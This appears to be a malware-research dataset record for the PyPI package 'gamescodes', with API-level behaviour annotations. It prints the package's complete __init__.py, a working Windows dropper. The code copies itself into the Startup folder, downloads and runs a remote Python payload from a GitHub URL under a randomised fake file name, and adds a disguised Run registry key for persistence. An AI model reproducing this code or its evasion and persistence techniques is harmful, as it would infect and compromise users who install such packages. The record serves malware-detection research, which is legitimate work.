{
  "metadata": {
    "package_name": "gamescodes-1",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/gamescodes-1.2-py3-none-any.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/gamescodes-1.2-py3-none-any/gamescodes/__init__.py",
      "code_snippets": [
        {
          "snippet": "from sys import executable\nfrom urllib import request\nfrom os import getenv, system, name, listdir, startfile\nfrom os.path import isfile\nimport winreg\nfrom random import choice\nfrom shutil import copy\n\npath = \"%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Update.pyw\" % getenv(\"userprofile\")\nif not isfile(path):\n    copy(__file__, path)\n    startfile(path)\n    exit()\nelif __file__.replace('\\\\', '/') != path.replace('\\\\', '/'):\n    exit()\n\nif name != 'nt': \n    exit()\n\ndef getPath():\n    path = choice([getenv(\"APPDATA\"), getenv(\"LOCALAPPDATA\")])\n    directory = listdir(path)\n    for _ in range(10):\n        chosen = choice(directory)\n        ye = path + \"\\\\\" + chosen\n        if not isfile(ye) and \" \" not in chosen:\n            return ye\n    return getenv(\"TEMP\")\n\ndef getName():\n    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))\n    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']\n    return firstName + choice(lasName)\n\n\ndef install(path):\n    with open(path, mode='w', encoding='utf-8') as f:\n        f.write(request.urlopen(\"https://raw.githubusercontent.com/IvanDevGames/index.js/main/1337.py\").read().decode(\"utf8\"))\n\ndef run(path):\n    system(f\"start {executable} {path}\")\n\ndef startUP(path):\n    faked = 'SecurityHealthSystray.exe'\n    address = f\"{executable} {path}\"\n    key1 = winreg.HKEY_CURRENT_USER\n    key2 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)\n    winreg.SetValueEx(open_, \"Realtek HD Audio Universal Service\", 0, winreg.REG_SZ, f\"{faked} & {address}\")\n\nDoYouKnowTheWay = getPath() + '\\\\' + getName()\ninstall(DoYouKnowTheWay)\nrun(DoYouKnowTheWay)\ntry:\n    startUP(DoYouKnowTheWay)\nexcept:\n    pass",
          "triple_sequences": [
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"userprofile\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine file presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "shutil.copy()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "__file__, path",
              "object_description": "Local file or directory",
              "object_id": "local_file_or_directory",
              "intention_description": "Copy file to startup directory",
              "intention_id": "copy_file_startup_directory"
            },
            {
              "action_api": "os.startfile()",
              "action_description": "Opens file with associated application",
              "action_id": "open_file_app",
              "object": "path",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            },
            {
              "action_api": "exit()",
              "action_description": "Exits program",
              "action_id": "exit_program",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Terminate program execution",
              "intention_id": "terminate_program_execution"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "__file__.replace('\\\\', '/') != path.replace('\\\\', '/')",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Determine file presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "exit()",
              "action_description": "Exits program",
              "action_id": "exit_program",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Terminate program execution",
              "intention_id": "terminate_program_execution"
            },
            {
              "action_api": "os.name",
              "action_description": "Retrieves operating system identifier",
              "action_id": "get_os_id",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Determine operating system",
              "intention_id": "determine_operating_system"
            },
            {
              "action_api": "exit()",
              "action_description": "Exits program",
              "action_id": "exit_program",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Terminate program execution",
              "intention_id": "terminate_program_execution"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"APPDATA\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"LOCALAPPDATA\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "random.choice()",
              "action_description": "Generate random integer",
              "action_id": "generate_random_integer",
              "object": "[getenv(\"APPDATA\"), getenv(\"LOCALAPPDATA\")]",
              "object_description": "User directory",
              "object_id": "user_directory",
              "intention_description": "Create random file name",
              "intention_id": "create_random_filename"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "random.choice()",
              "action_description": "Generate random integer",
              "action_id": "generate_random_integer",
              "object": "directory",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Create random file name",
              "intention_id": "create_random_filename"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "ye",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine file presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"TEMP\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "random.choice()",
              "action_description": "Generate random integer",
              "action_id": "generate_random_integer",
              "object": "'bcdefghijklmnopqrstuvwxyz'",
              "object_description": "Random string",
              "object_id": "random_string",
              "intention_description": "Create random file name",
              "intention_id": "create_random_filename"
            },
            {
              "action_api": "random.choice()",
              "action_description": "Generate random integer",
              "action_id": "generate_random_integer",
              "object": "lasName",
              "object_description": "File extension",
              "object_id": "file_extension",
              "intention_description": "Create random file name",
              "intention_id": "create_random_filename"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "path, mode='w', encoding='utf-8'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Open file for writing",
              "intention_id": "open_file_writing"
            },
            {
              "action_api": "urllib.request.urlopen()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "\"https://raw.githubusercontent.com/IvanDevGames/index.js/main/1337.py\"",
              "object_description": "URL string",
              "object_id": "url_string",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "http.client.HTTPResponse.read()",
              "action_description": "Process HTTP response content",
              "action_id": "process_http_response",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode downloaded content",
              "intention_id": "decode_downloaded_content"
            },
            {
              "action_api": "bytes.decode()",
              "action_description": "Decodes bytes using specified codec",
              "action_id": "decode_bytes_codec",
              "object": "\"utf8\"",
              "object_description": "Character encoding type",
              "object_id": "character_encoding_type",
              "intention_description": "Decode downloaded content",
              "intention_id": "decode_downloaded_content"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "f\"start {executable} {path}\"",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            },
            {
              "action_api": "winreg.CreateKeyEx()",
              "action_description": "Creates registry key",
              "action_id": "create_registry_key",
              "object": "key1, key2, 0, winreg.KEY_WRITE",
              "object_description": "Windows registry key",
              "object_id": "windows_registry_key",
              "intention_description": "Access Windows registry key",
              "intention_id": "access_registry_key"
            },
            {
              "action_api": "winreg.SetValueEx()",
              "action_description": "Sets value for registry key",
              "action_id": "set_registry_value",
              "object": "open_, \"Realtek HD Audio Universal Service\", 0, winreg.REG_SZ, f\"{faked} & {address}\"",
              "object_description": "Registry value",
              "object_id": "registry_value",
              "intention_description": "Add registry value for startup",
              "intention_id": "add_startup_registry_entry"
            }
          ]
        }
      ]
    }
  ]
}